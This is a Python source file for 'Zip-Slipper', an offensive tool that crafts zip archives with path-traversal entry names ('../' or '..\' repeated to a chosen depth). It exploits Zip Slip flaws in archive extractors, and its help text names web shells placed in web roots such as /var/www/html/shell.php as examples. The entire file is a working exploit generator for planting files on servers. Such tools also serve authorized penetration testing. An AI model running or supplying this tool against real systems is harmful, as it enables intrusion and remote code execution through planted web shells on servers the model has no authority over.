#!/usr/bin/env python3

import argparse 
import zipfile
from os.path import exists
from termcolor import colored

def print_message(message, type):
   if type == 'SUCCESS':
      print('[' + colored('SUCCESS', 'green') +  '] ' + message)
   elif type == 'INFO':
      print('[' + colored('INFO', 'blue') +  '] ' + message)
   elif type == 'WARNING':
      print('[' + colored('WARNING', 'yellow') +  '] ' + message)
   elif type == 'ALERT':
      print('[' + colored('ALERT', 'yellow') +  '] ' + message)
   elif type == 'ERROR':
      print('[' + colored('ERROR', 'red') +  '] ' + message)

def generate_payload_name(destination_file, platform, depth):
   match platform:
      case "linux":
         path_traversal = "../" * depth
      case "windows":
         path_traversal = "..\\" * depth
   return path_traversal[0:-1] + destination_file

def is_inside_zip(file_name, zip_name):
   zip_file = zipfile.ZipFile(zip_name, "r")
   return file_name in zip_file.namelist()

def write_zip_outfile(source_name, payload_name, output_name, mode):
   match mode:
      case "write":
         zip_file = zipfile.ZipFile(output_name, "w")
      case "append":
         zip_file = zipfile.ZipFile(output_name, "a")
   zip_file.write(source_name, payload_name)
   zip_file.close()

parser = argparse.ArgumentParser(description='Zip-Slipper: Creating Zip archives to exploit Zip-based Path Traversal vulnerabilities!')
parser.add_argument('SOURCE', type=str,
                  help='Source location of payload file (Example: "/home/user/exploit.php" or "shell.aspx")')
parser.add_argument('DESTINATION', type=str,
                  help='Destination location on exploited machine without Path Traversal (Example: "/var/www/html/shell.php" or "\\Users\\Administrator\\Web\\shell.aspx")')
parser.add_argument('-o','--outfile', type=str, default="payload.zip",
                  help='Output Zip file (Default: "payload.zip")')
parser.add_argument('-d','--depth', type=int , default=10,
                  help='Path Traversal Depth (Default: 10)')
parser.add_argument('-p','--platform', type=str, default="linux", choices=['linux', 'windows'],
                  help='Supported OS platforms to exploit (Default: linux)')
parser.add_argument('-m','--mode', type=str, default="write", choices=['append', 'write'],
                  help='Supported modes for writing Zip file (Default: write)')
args = parser.parse_args()

result_zip = args.outfile
source_payload = args.SOURCE
destination_payload = args.DESTINATION
path_traversal_depth = args.depth
mode = args.mode
platform = args.platform

if not exists(source_payload):
   message = 'Could not find the source file: "{file}"!'.format(file=args.SOURCE)
   print_message(message, "ERROR")
   exit()

if not exists(result_zip) and mode == "append":
   print_message("Unable to find the Zip file to append to!", "ERROR")
   exit()

if exists(result_zip) and mode == "write":
   message = 'The specified output file already exists "{file}"!'.format(file=result_zip)
   print_message(message, "WARNING")
   print_message("Recommended: Use the append mode (-m append)!", "INFO")
   choice = input("Are you sure you wish to overwrite this file (y/N)?")
   if choice != "y":
      print_message("Exiting program without changes!", "INFO")
      exit()

payload_name = generate_payload_name(destination_payload, platform, path_traversal_depth)

if mode == "append" and is_inside_zip(payload_name, result_zip):
   print_message('The file "{zip_file}" already contains the file "{payload}"!'.format(zip_file=result_zip, payload=payload_name), "ERROR")
   exit()

print_message('Writing {payload} to {zip_file}!'.format(payload=payload_name, zip_file=result_zip), "INFO")

try:
   write_zip_outfile(source_payload, payload_name, result_zip, mode)
except Exception as e:
   print_message("An error occurred when writing to the Zip file!", "ERROR")
   print(e)
else:
   print_message("Successfully wrote the payload!", "SUCCESS")
